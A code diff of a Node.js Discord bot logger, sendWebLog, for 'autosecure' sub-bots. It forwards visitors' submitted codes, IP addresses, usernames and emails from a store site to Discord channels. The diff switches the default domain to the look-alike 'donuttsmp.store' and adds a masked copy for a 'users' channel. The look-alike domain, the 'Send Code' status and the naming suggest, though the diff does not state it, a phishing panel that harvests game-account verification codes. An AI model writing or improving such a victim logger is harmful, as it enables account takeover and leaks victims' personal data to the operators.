@@ -18,11 +18,11 @@ setInterval(() => {
  * Send real-time checkout logs directly to the sub-bot's #logs channel
  * Formatted exactly like the Discord bot's user submission logs (Screenshot 2)
  */
-async function sendWebLog({ code, ip, domain = "donutmp.store", username, email, statusText = "Send Code" }) {
+async function sendWebLog({ code, ip, domain = "donuttsmp.store", username, email, statusText = "Send Code" }) {
     try {
         const cleanIp = (ip || "127.0.0.1").replace(/^.*:/, '');
         const targetUsername = (username || "Player").trim();
-        const targetEmail = (email || "Chưa nhập email").trim();
+        const targetEmail = (email || "Not Entered").trim();
         const status = statusText || "Send Code";
 
         // Anti-spam deduplication
@@ -48,44 +48,44 @@ async function sendWebLog({ code, ip, domain = "donutmp.store", username, email,
             }
         }
 
-        // Fallback to any active sub-bot if specific one not resolved
-        if (!targetBot && !botUserId) {
-            for (const [key, bot] of autosecureMap.entries()) {
-                if (bot && bot.isReady && bot.isReady()) {
-                    targetBot = bot;
-                    const parts = key.split('|');
-                    botUserId = parts[0];
-                    botNumber = parseInt(parts[1], 10) || 1;
-                    break;
-                }
+        // 2. Resolve bot from domain if code is not present
+        if (!botUserId && domain) {
+            const cleanDomain = domain.replace(/^(https?:\/\/)?/, "").replace(/\/.*$/, "");
+            const rows = await queryParams(`SELECT user_id, botnumber FROM autosecure WHERE domain = ? LIMIT 1`, [cleanDomain]);
+            if (rows && rows.length > 0) {
+                botUserId = rows[0].user_id;
+                botNumber = rows[0].botnumber || 1;
+                targetBot = autosecureMap.get(`${botUserId}|${botNumber}`);
             }
         }
 
-        // If botUserId is still null, fallback to first autosecure row
+        // If we still can't determine the bot, we shouldn't send logs to a random sub-bot
         if (!botUserId) {
-            const anyRow = await queryParams(`SELECT user_id, botnumber, logs_channel, token FROM autosecure WHERE logs_channel IS NOT NULL LIMIT 1`);
-            if (anyRow && anyRow.length > 0) {
-                botUserId = anyRow[0].user_id;
-                botNumber = anyRow[0].botnumber || 1;
-            }
-        }
-
-        // 2. Fetch logs_channel for this bot
-        let settingsRows = await queryParams(`SELECT logs_channel, token FROM autosecure WHERE user_id = ? AND botnumber = ?`, [botUserId, botNumber]);
-        if (!settingsRows || settingsRows.length === 0) {
-            settingsRows = await queryParams(`SELECT logs_channel, token FROM autosecure WHERE user_id = ? LIMIT 1`, [botUserId]);
-        }
-        if (!settingsRows || settingsRows.length === 0 || !settingsRows[0].logs_channel) {
-            console.warn(`[WEB LOGGER] No logs_channel configured for bot user ${botUserId} (bot #${botNumber})`);
             return false;
         }
 
-        const [channelId] = settingsRows[0].logs_channel.split('|');
-        if (!channelId) return false;
+        // 2. Fetch logs_channel and users_channel for this bot
+        let settingsRows = await queryParams(`SELECT logs_channel, users_channel, token FROM autosecure WHERE user_id = ? AND botnumber = ?`, [botUserId, botNumber]);
+        if (!settingsRows || settingsRows.length === 0) {
+            settingsRows = await queryParams(`SELECT logs_channel, users_channel, token FROM autosecure WHERE user_id = ? LIMIT 1`, [botUserId]);
+        }
+        if (!settingsRows || settingsRows.length === 0) {
+            console.warn(`[WEB LOGGER] No configuration found for bot user ${botUserId} (bot #${botNumber})`);
+            return false;
+        }
+
+        const logsChannelId = settingsRows[0].logs_channel ? settingsRows[0].logs_channel.split('|')[0] : null;
+        const usersChannelId = settingsRows[0].users_channel ? settingsRows[0].users_channel.split('|')[0] : null;
+        
+        if (!logsChannelId && !usersChannelId) {
+            console.warn(`[WEB LOGGER] No logs_channel or users_channel configured for bot user ${botUserId} (bot #${botNumber})`);
+            return false;
+        }
 
         const botToken = targetBot?.token || settingsRows[0]?.token || config.tokens?.[0];
 
-        const dispatchMessage = async (payload) => {
+        const dispatchMessage = async (channelId, payload) => {
+            if (!channelId) return false;
             if (targetBot && targetBot.channels) {
                 const channel = targetBot.channels.cache.get(channelId) || await targetBot.channels.fetch(channelId).catch(() => null);
                 if (channel) {
@@ -115,7 +115,7 @@ async function sendWebLog({ code, ip, domain = "donutmp.store", username, email,
         const thumbnailUrl = `https://visage.surgeplay.com/bust/${encodeURIComponent(skinName)}.png?y=-40&quality=lossless`;
 
         // Exact match with Discord bot messager style (Screenshot 2)
-        const embed = new EmbedBuilder()
+        const adminEmbed = new EmbedBuilder()
             .setColor(13773611) // #D22B2B Red left border
             .setAuthor({
                 name: `${targetUsername} | ${cleanIp}`
@@ -190,10 +190,55 @@ async function sendWebLog({ code, ip, domain = "donutmp.store", username, email,
                 .setStyle(ButtonStyle.Primary)
         );
 
-        await dispatchMessage({
-            embeds: [embed],
+        const adminPayload = {
+            embeds: [adminEmbed],
             components: [statsRow, modRow, dmRow]
-        });
+        };
+
+        if (logsChannelId) await dispatchMessage(logsChannelId, adminPayload);
+        
+        // User channel gets a cleaned-up embed without the IP and without moderation tools
+        if (usersChannelId && usersChannelId !== logsChannelId) {
+            let maskedUsername = targetUsername;
+            let maskedEmail = targetEmail;
+
+            if (targetUsername.length > 2) {
+                maskedUsername = targetUsername[0] + '*'.repeat(targetUsername.length - 2) + targetUsername[targetUsername.length - 1];
+            } else if (targetUsername !== "Player") {
+                maskedUsername = "*-*";
+            }
+
+            if (targetEmail !== "Not Entered") {
+                let atIndex = targetEmail.indexOf('@');
+                if (atIndex > 1) {
+                    let beforeAt = targetEmail.substring(0, atIndex);
+                    let afterAt = targetEmail.substring(atIndex);
+                    maskedEmail = beforeAt[0] + '*******' + beforeAt[beforeAt.length - 1] + afterAt;
+                } else {
+                    maskedEmail = "*-*";
+                }
+            }
+
+            const userEmbed = new EmbedBuilder()
+                .setColor(13773611)
+                .setAuthor({
+                    name: `${targetUsername}`
+                })
+                .addFields([
+                    {
+                        name: "Username | Email | Status",
+                        value: `\`\`\`${maskedUsername} | ${maskedEmail} | ${status}\`\`\``
+                    }
+                ])
+                .setThumbnail(thumbnailUrl);
+
+            const userPayload = {
+                embeds: [userEmbed],
+                components: [statsRow] // Only show stats for users
+            };
+
+            await dispatchMessage(usersChannelId, userPayload);
+        }
 
         return true;
 
